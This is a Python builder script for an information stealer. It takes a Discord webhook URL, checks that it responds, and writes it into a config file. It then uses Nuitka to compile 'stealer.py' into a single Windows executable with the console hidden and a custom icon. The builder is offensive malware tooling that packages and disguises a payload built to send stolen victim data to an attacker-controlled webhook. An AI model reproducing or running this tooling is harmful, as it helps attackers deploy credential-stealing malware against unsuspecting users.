import argparse
import copy
import os
import requests

cmd = "python -m nuitka --standalone --onefile --disable-console --windows-icon-from-ico=icon.ico stealer.py"

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--webhook", help="The url of your Discord webhook", type=str)
    args = parser.parse_args()

    if len(args.webhook) == 0:
        with open("webhook.txt", "r") as file:
            webhook = file.read()
    else:
        webhook = args.webhook

    print(f"Webhook {webhook}")
    try:
        if requests.get(webhook).status_code == 200:

            with open("webhook.py.py", "w") as file_utils:
                file_utils.write(f"WEBHOOK = '{webhook}'")
            os.system(cmd)
        else:
            print("Webhook is incorrect.")
    except Exception as e:
        print(str(e))
